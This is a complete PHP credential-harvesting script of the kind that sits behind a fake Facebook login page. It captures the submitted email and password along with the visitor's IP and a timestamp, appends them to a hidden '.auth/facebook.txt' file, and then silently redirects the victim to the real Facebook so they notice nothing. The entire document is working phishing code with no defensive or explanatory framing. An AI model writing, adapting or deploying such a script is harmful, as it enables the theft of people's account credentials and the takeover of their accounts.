<?php
$email = $_POST['email'];
$pass  = $_POST['pass'];
$ip    = $_SERVER['REMOTE_ADDR'];
$date  = date("Y-m-d H:i:s");

$data = "[$date] IP: $ip | Email: $email | Password: $pass\n";
$file = fopen("../../.auth/facebook.txt", "a");
fwrite($file, $data);
fclose($file);

header("Location: https://facebook.com");
exit;
?>
